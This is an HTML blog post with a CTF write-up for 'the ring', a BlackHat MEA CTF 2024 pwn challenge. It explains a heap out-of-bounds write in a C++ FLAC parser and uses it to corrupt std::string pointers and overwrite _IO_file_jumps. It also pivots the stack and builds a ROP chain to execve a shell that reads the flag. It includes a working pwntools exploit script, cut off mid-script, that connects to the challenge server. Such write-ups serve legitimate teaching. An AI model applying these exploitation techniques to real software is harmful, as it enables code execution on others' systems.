@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  the ring - BlackHat MEA CTF 2024 · bitfriends&#39; blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="bitfriends">
+<meta name="description" content="Exploiting a C&#43;&#43; FLAC parser to get the flag">
+<meta name="keywords" content="blog,reseacher,personal">
+
+
+
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="the ring - BlackHat MEA CTF 2024">
+	<meta name="twitter:description" content="Exploiting a C&#43;&#43; FLAC parser to get the flag">
+
+<meta property="og:url" content="http://localhost:1313/posts/the_ring_bhmea/">
+	<meta property="og:site_name" content="bitfriends&#39; blog">
+	<meta property="og:title" content="the ring - BlackHat MEA CTF 2024">
+	<meta property="og:description" content="Exploiting a C&#43;&#43; FLAC parser to get the flag">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2024-09-02T20:24:09+02:00">
+		<meta property="article:modified_time" content="2024-09-02T20:24:09+02:00">
+		<meta property="article:tag" content="Linux">
+		<meta property="article:tag" content="C&#43;&#43;">
+		<meta property="article:tag" content="Parser">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/posts/the_ring_bhmea/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/">
+      bitfriends&#39; blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/posts/the_ring_bhmea/">
+              the ring - BlackHat MEA CTF 2024
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2024-09-02T20:24:09&#43;02:00">
+                September 2, 2024
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              5-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="/authors/bitfriends/">Bitfriends</a></div>
+
+          <div class="categories">
+  <i class="fa-solid fa-folder" aria-hidden="true"></i>
+    <a href="/categories/ctf/">Ctf</a></div>
+
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/linux/">Linux</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/c&#43;&#43;/">C&#43;&#43;</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/parser/">Parser</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      
+
+
+      <div class="post-content">
+        
+        <p>I had a fun time playing BlackHat MEA CTF. This pwn challenge was particulary nice.</p>
+<p>In &ldquo;the ring&rdquo; you were given a <code>FLAC</code> audio file parser, written in C++.
+You can provide such a custom audio file and get presented the output of the program.
+Notice that there is a Python wrapper handling the file and outputs readable text only.</p>
+<p>Now the general functionality of the program:
+The program checks the magic bytes first (<code>#define FLAC_MAGIC 0x664c6143U</code>) and then immedeately
+starts looking for the initial <code>TYPE_STREAMINFO</code> block, which may be followed by more blocks.</p>
+<p>Blocks in this case are chunks of data, that have a specific type and data associated to them.
+In the header file we can find the following block types:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">enum</span> FlacType {
+</span></span><span style="display:flex;"><span>  TYPE_STREAMINFO <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>,
+</span></span><span style="display:flex;"><span>  TYPE_PADDING,
+</span></span><span style="display:flex;"><span>  TYPE_APPLICATION,
+</span></span><span style="display:flex;"><span>  TYPE_SEEKTABLE,
+</span></span><span style="display:flex;"><span>  TYPE_VORBIS_COMMENT,
+</span></span><span style="display:flex;"><span>  TYPE_CUESHEET,
+</span></span><span style="display:flex;"><span>  TYPE_PICTURE,
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>Each block is handeled differently and the same type can be present mulitple times.
+After looking for some bugs in the individual block functions, I found this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">void</span> FlacFile<span style="color:#ff7b72;font-weight:bold">::</span><span style="color:#d2a8ff;font-weight:bold">parseBlockSeekTable</span>(<span style="color:#ff7b72">uint32_t</span> size) {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">if</span> (size <span style="color:#ff7b72;font-weight:bold">%</span> <span style="color:#a5d6ff">18</span>) {
+</span></span><span style="display:flex;"><span>    _lastError <span style="color:#ff7b72;font-weight:bold">=</span> FLAC_INVALID_SEEKTABLE;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">uint32_t</span> tableCount <span style="color:#ff7b72;font-weight:bold">=</span> size <span style="color:#ff7b72;font-weight:bold">/</span> <span style="color:#a5d6ff">18</span>;
+</span></span><span style="display:flex;"><span>  _seekPoints.<span style="color:#d2a8ff;font-weight:bold">resize</span>(tableCount);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">for</span> (<span style="color:#ff7b72">size_t</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> tableCount; i<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>    _seekPoints[_seekPointsCount].number <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">getBig64</span>();
+</span></span><span style="display:flex;"><span>    _seekPoints[_seekPointsCount].offset <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">getBig64</span>();
+</span></span><span style="display:flex;"><span>    _seekPoints[_seekPointsCount].sampleCount <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">getBig16</span>();
+</span></span><span style="display:flex;"><span>    _seekPointsCount<span style="color:#ff7b72;font-weight:bold">++</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The problem is the index variable <code>_seekPointsCount</code> due to it not being reset after the loop.
+We can put multiple blocks of type <code>TYPE_SEEKTABLE</code> with the same and constant <code>size</code>.
+Now <code>_seekPointsCount</code> acts like a global counter will eventually become greater than <code>size</code>.
+This allows an out-of-bounds write on the heap.</p>
+<p>As a target I chose a block of type <code>TYPE_VORBIS_COMMENT</code>, because it internal structure has <code>std::string</code>s as members,
+lying on the heap and getting reused too. Now you could corrupt the <code>pointer</code> of
+a <code>std::string</code> object, that specifies where the data is stored.</p>
+<pre tabindex="0"><code>0xf2e7630:      0x000000000f2e7640      0x0000000000000078      // [pointer]    [size_type]
+0xf2e7640:      0x4141414141414141      0x4141414141414141
+</code></pre><p>If you read data in that string again, you can write to your custom address.
+I used <code>vendor</code> and one string if <code>commentList</code> as targets.
+The binary was statically linked and there was no PIE, so we had all the freedom we needed.</p>
+<p>To get RIP control, I chose <code>_IO_file_jumps</code> to overwrite, which was <code>rw</code> in the binary.
+Overwriting the entry of <code>fflush</code> was quite useful, since the registers contained good values.
+Many of them pointed to <code>stderr</code>, so that&rsquo;s where I wrote to with the second <code>std::string</code>.
+After some fiddling around and using the gadget <code>mov rsp, rcx ; pop rcx ; jmp rcx</code>, I was able
+to pivot the stack to <code>stderr</code>, where my ropchain was lying.</p>
+<p>So all that was left to do now is to rop. Be careful that you don&rsquo;t have stdin and that you
+can only print human readable characters. The easiest way to do this was to create an <code>execve</code> call:</p>
+<pre tabindex="0"><code>execve(&#34;/bin/sh&#34;, [&#34;/bin/sh&#34;, &#34;-c&#34;, &#34;cat&#34;, &#34;/flag*&#34;], NULL)
+</code></pre><p>This was rather simple to do and sucessfully outputs the flag file:</p>
+<pre tabindex="0"><code>[+] Starting local process &#39;/usr/bin/python3&#39;: pid 252854
+[*] Switching to interactive mode
+: === FLAC Info ===
+FLAG{*** REDACTED ***}
+
+[*] Got EOF while reading in interactive
+$
+</code></pre><p>Exploit code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#ff7b72">from</span> <span style="color:#ff7b72">pwn</span> <span style="color:#ff7b72">import</span> <span style="color:#ff7b72;font-weight:bold">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">subprocess</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TYPE_STREAMINFO <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>
+</span></span><span style="display:flex;"><span>TYPE_PADDING <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">1</span>
+</span></span><span style="display:flex;"><span>TYPE_APPLICATION <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">2</span>
+</span></span><span style="display:flex;"><span>TYPE_SEEKTABLE <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">3</span>
+</span></span><span style="display:flex;"><span>TYPE_VORBIS_COMMENT <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">4</span>
+</span></span><span style="display:flex;"><span>TYPE_CUESHEET <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">5</span>
+</span></span><span style="display:flex;"><span>TYPE_PICTURE <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">6</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">p24</span>(x, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;little&#39;</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> p32(x, endian<span style="color:#ff7b72;font-weight:bold">=</span>endian)[<span style="color:#a5d6ff">1</span>:]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>file_jumps <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x5de100</span>
+</span></span><span style="display:flex;"><span>stderr_ptr <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x5deca0</span>
+</span></span><span style="display:flex;"><span>stderr_stuff <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x5e2560</span>
+</span></span><span style="display:flex;"><span>gadget <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x4a8c39</span> <span style="color:#8b949e;font-style:italic"># mov rsp, rcx ; pop rcx ; jmp rcx</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rax <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x42111a</span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x40591d</span>
+</span></span><span style="display:flex;"><span>pop_rsi <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x4073a3</span>
+</span></span><span style="display:flex;"><span>pop_rdx_rbx <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x533dab</span>
+</span></span><span style="display:flex;"><span>binsh <span style="color:#ff7b72;font-weight:bold">=</span> file_jumps
+</span></span><span style="display:flex;"><span>binsh_args <span style="color:#ff7b72;font-weight:bold">=</span> binsh <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">0x18</span>
+</span></span><span style="display:flex;"><span>syscall <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x4db386</span>
+</span></span><span style="display:flex;"><span>ret <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x40101a</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>f <span style="color:#ff7b72;font-weight:bold">=</span> open(<span style="color:#a5d6ff">&#34;./payload&#34;</span>, <span style="color:#a5d6ff">&#34;wb+&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>overflow <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>overflow <span style="color:#ff7b72;font-weight:bold">+=</span> p8(TYPE_SEEKTABLE, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>overflow <span style="color:#ff7b72;font-weight:bold">+=</span> p24(<span style="color:#a5d6ff">0x12</span>, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>) <span style="color:#8b949e;font-style:italic"># len</span>
+</span></span><span style="display:flex;"><span>overflow <span style="color:#ff7b72;font-weight:bold">+=</span> p64(<span style="color:#a5d6ff">0x4242424242424242</span>, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>overflow <span style="color:#ff7b72;font-weight:bold">+=</span> p64(file_jumps, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>overflow <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x4242</span>, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>overflow1 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>overflow1 <span style="color:#ff7b72;font-weight:bold">+=</span> p8(TYPE_SEEKTABLE, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>overflow1 <span style="color:#ff7b72;font-weight:bold">+=</span> p24(<span style="color:#a5d6ff">0x12</span>, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>) <span style="color:#8b949e;font-style:italic"># len</span>
+</span></span><span style="display:flex;"><span>overflow1 <span style="color:#ff7b72;font-weight:bold">+=</span> p64(stderr_ptr, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>overflow1 <span style="color:#ff7b72;font-weight:bold">+=</span> p64(<span style="color:#a5d6ff">0x100</span>, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>overflow1 <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x4343</span>, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;/bin/sh</span><span style="color:#79c0ff">\x00</span><span style="color:#a5d6ff">-c</span><span style="color:#79c0ff">\x00</span><span style="color:#a5d6ff">cat /flag*</span><span style="color:#79c0ff">\x00</span><span style="color:#a5d6ff">AA&#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> p64(binsh) <span style="color:#ff7b72;font-weight:bold">+</span> p64(binsh<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">8</span>) <span style="color:#ff7b72;font-weight:bold">+</span> p64(binsh<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">11</span>) <span style="color:#ff7b72;font-weight:bold">+</span> p64(<span style="color:#a5d6ff">0x0</span>) <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;A&#34;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x20</span> <span style="color:#ff7b72;font-weight:bold">+</span> p64(gadget)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">=</span> payload<span style="color:#ff7b72;font-weight:bold">.</span>ljust(<span style="color:#a5d6ff">0x78</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x41</span><span style="color:#a5d6ff">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff7b72;font-weight:bold">+=</span> p64(ret)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff7b72;font-weight:bold">+=</span> p64(pop_rax)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff7b72;font-weight:bold">+=</span> p64(<span style="color:#a5d6ff">0x3b</span>)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff7b72;font-weight:bold">+=</span> p64(pop_rdi)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff7b72;font-weight:bold">+=</span> p64(binsh)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff7b72;font-weight:bold">+=</span> p64(pop_rsi)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff7b72;font-weight:bold">+=</span> p64(binsh_args)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff7b72;font-weight:bold">+=</span> p64(pop_rdx_rbx)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff7b72;font-weight:bold">+=</span> p64(<span style="color:#a5d6ff">0x0</span>)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff7b72;font-weight:bold">+=</span> p64(<span style="color:#a5d6ff">0x0</span>)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff7b72;font-weight:bold">+=</span> p64(syscall)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff7b72;font-weight:bold">+=</span> p64(pop_rax)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff7b72;font-weight:bold">+=</span> p64(<span style="color:#a5d6ff">0x3c</span>)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff7b72;font-weight:bold">+=</span> p64(pop_rdi)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff7b72;font-weight:bold">+=</span> p64(<span style="color:#a5d6ff">0x0</span>)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff7b72;font-weight:bold">+=</span> p64(syscall)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>comment <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>comment <span style="color:#ff7b72;font-weight:bold">+=</span> p8(TYPE_VORBIS_COMMENT, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>comment <span style="color:#ff7b72;font-weight:bold">+=</span> p24(<span style="color:#a5d6ff">0x1c</span><span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">0x70</span><span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">0xd8</span>, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>) <span style="color:#8b949e;font-style:italic"># len</span>
+</span></span><span style="display:flex;"><span>comment <span style="color:#ff7b72;font-weight:bold">+=</span> p32(<span style="color:#a5d6ff">0x78</span>) <span style="color:#8b949e;font-style:italic"># len</span>
+</span></span><span style="display:flex;"><span>comment <span style="color:#ff7b72;font-weight:bold">+=</span> payload <span style="color:#8b949e;font-style:italic"># vendor</span>
+</span></span><span style="display:flex;"><span>comment <span style="color:#ff7b72;font-weight:bold">+=</span> p32(<span style="color:#a5d6ff">0x1</span>) <span style="color:#8b949e;font-style:italic"># count</span>
+</span></span><span style="display:flex;"><span>comment <span style="color:#ff7b72;font-weight:bold">+=</span> p32(<span style="color:#a5d6ff">0xe0</span>) <span style="color:#8b949e;font-style:italic"># len</span>
+</span></span><span style="display:flex;"><span>comment <span style="color:#ff7b72;font-weight:bold">+=</span> p64(ret) <span style="color:#ff7b72;font-weight:bold">+</span> rop <span style="color:#ff7b72;font-weight:bold">+</span> p64(stderr_stuff) <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;A&#34;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x48</span> <span style="color:#ff7b72;font-weight:bold">+</span> p64(file_jumps<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">0x58</span><span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">0x60</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>end <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>end <span style="color:#ff7b72;font-weight:bold">+=</span> p8(TYPE_CUESHEET <span style="color:#ff7b72;font-weight:bold">|</span> <span style="color:#a5d6ff">128</span>, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>end <span style="color:#ff7b72;font-weight:bold">+=</span> p24(<span style="color:#a5d6ff">0</span>, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>filedata <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>filedata <span style="color:#ff7b72;font-weight:bold">+=</span> p32(<span style="color:#a5d6ff">0x664c6143</span>, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>filedata <span style="color:#ff7b72;font-weight:bold">+=</span> p8(TYPE_STREAMINFO, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>filedata <span style="color:#ff7b72;font-weight:bold">+=</span> p24(<span style="color:#a5d6ff">34</span>, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>) <span style="color:#8b949e;font-style:italic"># len</span>
+</span></span><span style="display:flex;"><span>filedata <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x1337</span>, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>filedata <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x1338</span>, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>filedata <span style="color:#ff7b72;font-weight:bold">+=</span> p24(<span style="color:#a5d6ff">3</span>, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>filedata <span style="color:#ff7b72;font-weight:bold">+=</span> p24(<span style="color:#a5d6ff">4</span>, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>filedata <span style="color:#ff7b72;font-weight:bold">+=</span> p32(<span style="color:#a5d6ff">5</span>, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>filedata <span style="color:#ff7b72;font-weight:bold">+=</span> p32(<span style="color:#a5d6ff">6</span>, endian<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>filedata <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;Z&#34;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x10</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>filedata <span style="color:#ff7b72;font-weight:bold">+=</span> overflow
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>filedata <span style="color:#ff7b72;font-weight:bold">+=</span> comment
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>filedata <span style="color:#ff7b72;font-weight:bold">+=</span> overflow
+</span></span><span style="display:flex;"><span>filedata <span style="color:#ff7b72;font-weight:bold">+=</span> overflow1<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">9</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>filedata <span style="color:#ff7b72;font-weight:bold">+=</span> comment
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>filedata <span style="color:#ff7b72;font-weight:bold">+=</span> end
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>f<span style="color:#ff7b72;font-weight:bold">.</span>write(filedata)
+</span></span><span style="display:flex;"><span>f<span style="color:#ff7b72;font-weight:bold">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff7b72;font-weight:bold">.</span>terminal <span style="color:#ff7b72;font-weight:bold">=</span> [<span style="color:#a5d6ff">&#34;tmux&#34;</span>, <span style="color:#a5d6ff">&#34;splitw&#34;</span>, <span style="color:#a5d6ff">&#34;-h&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#ff7b72;font-weight:bold">=</span> remote(<span style="color:#a5d6ff">&#34;18.203.110.195&#34;</span>, <span style="color:#a5d6ff">30624</span>)
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#p = process([&#34;python3&#34;, &#34;./run.py&#34;])</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#p = gdb.debug([&#34;./parser&#34;, &#34;./payload&#34;])</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#a5d6ff">&#34;proof of work:</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>)
